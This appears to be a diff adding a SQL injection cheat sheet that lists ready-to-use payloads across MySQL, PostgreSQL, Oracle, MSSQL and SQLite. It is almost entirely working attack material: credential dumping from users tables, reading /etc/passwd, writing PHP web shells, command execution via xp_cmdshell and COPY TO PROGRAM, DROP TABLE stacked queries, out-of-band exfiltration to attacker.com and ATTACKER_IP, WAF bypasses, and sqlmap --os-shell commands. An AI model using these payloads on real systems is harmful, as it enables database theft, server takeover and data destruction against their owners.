@@ -1,0 +1,471 @@
+# Complete SQL Injection Commands Collection - Database Enumeration & Data Extraction
+
+```sql
+# =============================================================================
+# MYSQL SQL INJECTION PAYLOADS
+# =============================================================================
+
+# Basic MySQL Detection
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 --
+" OR 1=1 --
+' OR 1=1#
+" OR 1=1#
+
+# MySQL Version Detection
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' AND 1=2 UNION SELECT NULL,@@version--
+' AND 1=2 UNION SELECT NULL,version()#
+
+# Current Database Name
+' UNION SELECT database()--
+' UNION SELECT schema()--
+' AND 1=2 UNION SELECT NULL,database()#
+
+# Current User
+' UNION SELECT user()--
+' UNION SELECT current_user()--
+' UNION SELECT system_user()--
+
+# List All Databases
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT NULL,schema_name FROM information_schema.schemata#
+' AND 1=2 UNION SELECT NULL,GROUP_CONCAT(schema_name) FROM information_schema.schemata--
+
+# List All Tables
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()#
+
+# List Tables from Specific Database
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'--
+' UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='database_name'#
+
+# List All Columns
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'#
+
+# List Columns from Specific Table
+' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='database_name' AND table_name='table_name'--
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users'#
+
+# Extract Data from Tables
+' UNION SELECT username,password FROM users--
+' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users#
+' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password,0x3c62723e) FROM users#
+
+# Extract All Data from Specific Columns
+' UNION SELECT username FROM users--
+' UNION SELECT NULL,username FROM users WHERE id=1--
+' UNION SELECT NULL,GROUP_CONCAT(username) FROM users#
+
+# Multiple Column Data Extraction
+' UNION SELECT id,username,password,email FROM users--
+' UNION SELECT NULL,CONCAT(id,0x3a,username,0x3a,password,0x3a,email) FROM users--
+' UNION SELECT NULL,GROUP_CONCAT(CONCAT(id,0x3a,username,0x3a,password)) FROM users#
+
+# File Read Operations (if FILE privilege)
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd')#
+' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')--
+
+# File Write Operations (if FILE privilege)
+' UNION SELECT 'test' INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'#
+
+# Time-Based Blind SQL Injection
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+
+# Boolean-Based Blind SQL Injection
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(database(),1,1)='a'--
+' AND ASCII(SUBSTRING(database(),1,1))>97--
+
+# Error-Based SQL Injection
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND extractvalue(1,CONCAT(0x7e,(SELECT database())))--
+' AND updatexml(1,CONCAT(0x7e,(SELECT database())),1)--
+
+# =============================================================================
+# POSTGRESQL SQL INJECTION PAYLOADS
+# =============================================================================
+
+# Basic PostgreSQL Detection
+' OR '1'='1
+' OR 1=1--
+' OR 1=1/*
+
+# PostgreSQL Version Detection
+' UNION SELECT version()--
+' UNION SELECT NULL,version()--
+' AND 1=2 UNION SELECT NULL,version()--
+
+# Current Database Name
+' UNION SELECT current_database()--
+' UNION SELECT NULL,current_database()--
+
+# Current User
+' UNION SELECT current_user--
+' UNION SELECT user--
+' UNION SELECT session_user--
+
+# List All Databases
+' UNION SELECT datname FROM pg_database--
+' UNION SELECT NULL,datname FROM pg_database--
+' UNION SELECT string_agg(datname,',') FROM pg_database--
+
+# List All Tables
+' UNION SELECT tablename FROM pg_tables--
+' UNION SELECT NULL,tablename FROM pg_tables WHERE schemaname='public'--
+' UNION SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--
+
+# List Tables from Specific Schema
+' UNION SELECT tablename FROM pg_tables WHERE schemaname='schema_name'--
+' UNION SELECT NULL,string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--
+
+# List All Columns
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'--
+
+# List Columns from Specific Table
+' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'--
+' UNION SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'--
+
+# Extract Data from Tables
+' UNION SELECT username,password FROM users--
+' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
+' UNION SELECT string_agg(username||':'||password,',') FROM users--
+
+# Extract All Data from Specific Columns
+' UNION SELECT username FROM users--
+' UNION SELECT NULL,username FROM users WHERE id=1--
+' UNION SELECT string_agg(username,',') FROM users--
+
+# Multiple Column Data Extraction
+' UNION SELECT id,username,password,email FROM users--
+' UNION SELECT NULL,CONCAT(id,':',username,':',password,':',email) FROM users--
+' UNION SELECT string_agg(id||':'||username||':'||password,',') FROM users--
+
+# File Read Operations
+' UNION SELECT pg_read_file('/etc/passwd')--
+' UNION SELECT NULL,pg_read_file('/etc/passwd')--
+'; COPY (SELECT '') TO '/tmp/test'; DROP TABLE IF EXISTS temp_file; CREATE TABLE temp_file(content text); COPY temp_file FROM '/etc/passwd'--
+
+# File Write Operations (requires superuser)
+'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--
+
+# Command Execution (requires superuser)
+'; COPY (SELECT '') TO PROGRAM 'id'--
+'; COPY (SELECT '') TO PROGRAM 'whoami'--
+
+# Time-Based Blind SQL Injection
+' AND pg_sleep(5)--
+'||pg_sleep(5)--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+# Boolean-Based Blind SQL Injection
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(current_database(),1,1)='a'--
+' AND ASCII(SUBSTRING(current_database(),1,1))>97--
+
+# Error-Based SQL Injection
+' AND CAST((SELECT version()) AS int)--
+' AND 1=CAST((SELECT current_database()) AS int)--
+
+# =============================================================================
+# ORACLE SQL INJECTION PAYLOADS
+# =============================================================================
+
+# Basic Oracle Detection
+' OR '1'='1
+' OR 1=1--
+' OR 1=1/*
+
+# Oracle Version Detection
+' UNION SELECT banner FROM v$version--
+' UNION SELECT NULL,banner FROM v$version WHERE ROWNUM=1--
+' UNION SELECT banner FROM v$version WHERE banner LIKE '%Oracle%'--
+
+# Current Database Name (Schema)
+' UNION SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual--
+' UNION SELECT user FROM dual--
+
+# Current User
+' UNION SELECT USER FROM dual--
+' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual--
+
+# List All Tables (accessible to current user)
+' UNION SELECT table_name FROM all_tables--
+' UNION SELECT NULL,table_name FROM all_tables--
+' UNION SELECT table_name FROM user_tables--
+
+# List Tables from Specific Owner
+' UNION SELECT table_name FROM all_tables WHERE owner='SYSTEM'--
+' UNION SELECT NULL,table_name FROM all_tables WHERE owner='HR'--
+
+# List All Columns
+' UNION SELECT column_name FROM all_tab_columns--
+' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
+' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS'--
+
+# List Columns from Specific Table
+' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS' AND owner='HR'--
+' UNION SELECT NULL,column_name FROM user_tab_columns WHERE table_name='USERS'--
+
+# Extract Data from Tables
+' UNION SELECT username,password FROM users--
+' UNION SELECT NULL,username||':'||password FROM users--
+' UNION SELECT username||':'||password FROM users WHERE ROWNUM<=10--
+
+# Extract All Data from Specific Columns
+' UNION SELECT username FROM users--
+' UNION SELECT NULL,username FROM users WHERE id=1--
+' UNION SELECT username FROM users WHERE ROWNUM<=5--
+
+# Multiple Column Data Extraction
+' UNION SELECT id,username,password,email FROM users WHERE ROWNUM<=1--
+' UNION SELECT NULL,id||':'||username||':'||password||':'||email FROM users--
+
+# Oracle-specific concatenation
+' UNION SELECT NULL,username||' '||password FROM users--
+' UNION SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY id) FROM users--
+
+# Time-Based Blind SQL Injection
+' AND DBMS_LOCK.SLEEP(5)=1--
+' UNION SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual--
+
+# Boolean-Based Blind SQL Injection
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTR(user,1,1)='S'--
+' AND ASCII(SUBSTR(user,1,1))>64--
+
+# Error-Based SQL Injection
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--
+' AND 1=XMLType((SELECT user FROM dual))--
+
+# Oracle XML Functions
+' UNION SELECT NULL,extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ATTACKER_IP/"> %remote;]>'),'/l') FROM dual--
+
+# =============================================================================
+# MSSQL SQL INJECTION PAYLOADS
+# =============================================================================
+
+# Basic MSSQL Detection
+' OR '1'='1
+' OR 1=1--
+' OR 1=1/*
+
+# MSSQL Version Detection
+' UNION SELECT @@version--
+' UNION SELECT NULL,@@version--
+
+# Current Database Name
+' UNION SELECT DB_NAME()--
+' UNION SELECT NULL,DB_NAME()--
+
+# Current User
+' UNION SELECT SYSTEM_USER--
+' UNION SELECT CURRENT_USER--
+' UNION SELECT USER_NAME()--
+
+# List All Databases
+' UNION SELECT name FROM sys.databases--
+' UNION SELECT NULL,name FROM master..sysdatabases--
+
+# List All Tables
+' UNION SELECT name FROM sys.tables--
+' UNION SELECT NULL,name FROM sys.objects WHERE type='U'--
+' UNION SELECT table_name FROM information_schema.tables--
+
+# List Tables from Specific Database
+' UNION SELECT name FROM database_name.sys.tables--
+' UNION SELECT NULL,table_name FROM database_name.information_schema.tables--
+
+# List All Columns
+' UNION SELECT name FROM sys.columns--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
+
+# List Columns from Specific Table
+' UNION SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+
+# Extract Data from Tables
+' UNION SELECT username,password FROM users--
+' UNION SELECT NULL,username+':'+password FROM users--
+' UNION SELECT CONCAT(username,':',password) FROM users--
+
+# Extract All Data from Specific Columns
+' UNION SELECT username FROM users--
+' UNION SELECT NULL,username FROM users WHERE id=1--
+
+# Multiple Column Data Extraction
+' UNION SELECT id,username,password,email FROM users--
+' UNION SELECT NULL,CONCAT(id,':',username,':',password,':',email) FROM users--
+
+# Time-Based Blind SQL Injection
+'; WAITFOR DELAY '00:00:05'--
+' IF (1=1) WAITFOR DELAY '00:00:05'--
+'; IF (SELECT user)='sa' WAITFOR DELAY '00:00:05'--
+
+# Boolean-Based Blind SQL Injection
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(DB_NAME(),1,1)='m'--
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))>100--
+
+# Error-Based SQL Injection
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT DB_NAME()) AS int)--
+
+# Command Execution (xp_cmdshell must be enabled)
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--
+
+# File Read Operations
+' UNION SELECT NULL,BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts',SINGLE_CLOB) AS x--
+
+# =============================================================================
+# SQLITE SQL INJECTION PAYLOADS
+# =============================================================================
+
+# Basic SQLite Detection
+' OR '1'='1
+' OR 1=1--
+
+# SQLite Version Detection
+' UNION SELECT sqlite_version()--
+' UNION SELECT NULL,sqlite_version()--
+
+# List All Tables
+' UNION SELECT name FROM sqlite_master WHERE type='table'--
+' UNION SELECT NULL,name FROM sqlite_master WHERE type='table'--
+' UNION SELECT sql FROM sqlite_master WHERE type='table'--
+
+# List All Columns
+' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users'--
+' UNION SELECT NULL,sql FROM sqlite_master WHERE tbl_name='users'--
+
+# Extract Data from Tables
+' UNION SELECT username,password FROM users--
+' UNION SELECT NULL,username||':'||password FROM users--
+
+# =============================================================================
+# UNION-BASED SQL INJECTION - DETERMINING COLUMN COUNT
+# =============================================================================
+
+# Order By Method
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+(Continue until error)
+
+# Union Select NULL Method
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+(Continue until no error)
+
+# =============================================================================
+# ADVANCED SQL INJECTION TECHNIQUES
+# =============================================================================
+
+# Stacked Queries (if supported)
+'; DROP TABLE users--
+'; CREATE TABLE test(id int)--
+'; INSERT INTO users VALUES('hacker','pass')--
+
+# Second Order SQL Injection
+admin'-- (stored)
+admin' OR '1'='1 (stored)
+
+# Out-of-Band Data Exfiltration (MySQL)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\share\\file'))--
+
+# Out-of-Band Data Exfiltration (MSSQL)
+'; DECLARE @q varchar(1024); SET @q='\\'+DB_NAME()+'.attacker.com\share\file'; EXEC master..xp_dirtree @q--
+
+# Out-of-Band Data Exfiltration (Oracle)
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual--
+
+# Out-of-Band Data Exfiltration (PostgreSQL)
+'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_database())||'.attacker.com'--
+
+# =============================================================================
+# WAF BYPASS TECHNIQUES
+# =============================================================================
+
+# Case Variation
+' UnIoN SeLeCt NULL--
+' uNiOn sElEcT NULL--
+
+# Comments
+'/**/UNION/**/SELECT/**/NULL--
+'/*!UNION*//*!SELECT*/NULL--
+'/*! UNION *//*! SELECT */NULL--
+
+# URL Encoding
+%27%20UNION%20SELECT%20NULL--
+%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c--
+
+# Double URL Encoding
+%2527%2520UNION%2520SELECT%2520NULL--
+
+# Hex Encoding
+0x27204f522031=31--
+
+# String Concatenation (MySQL)
+' UNION SELECT CONCAT('a','b')--
+' UNION SELECT 'a'+'b'--
+
+# Alternative Whitespace
+'%09UNION%09SELECT%09NULL--
+'%0aUNION%0aSELECT%0aNULL--
+'%0dUNION%0dSELECT%0dNULL--
+'%a0UNION%a0SELECT%a0NULL--
+
+# =============================================================================
+# AUTOMATED SQL INJECTION TOOLS
+# =============================================================================
+
+# SQLMap Commands
+sqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables
+sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns
+sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name -C username,password --dump
+sqlmap -u "http://target.com/page?id=1" --os-shell
+sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# SQLMap with POST data
+sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --dbs
+sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --dump
+
+# SQLMap with cookies
+sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abcd1234" --dbs
+
+# SQLMap with proxy
+sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --dbs
+```
+
+**Usage Notes:**
+- Replace `10.10.14.1` and `attacker.com` with your actual IP/domain
+- Replace `database_name`, `table_name`, `column_name` with actual names
+- Always test with proper authorization
+- Start with basic payloads and escalate as needed
+- Monitor responses for errors, timing differences, and data leaks
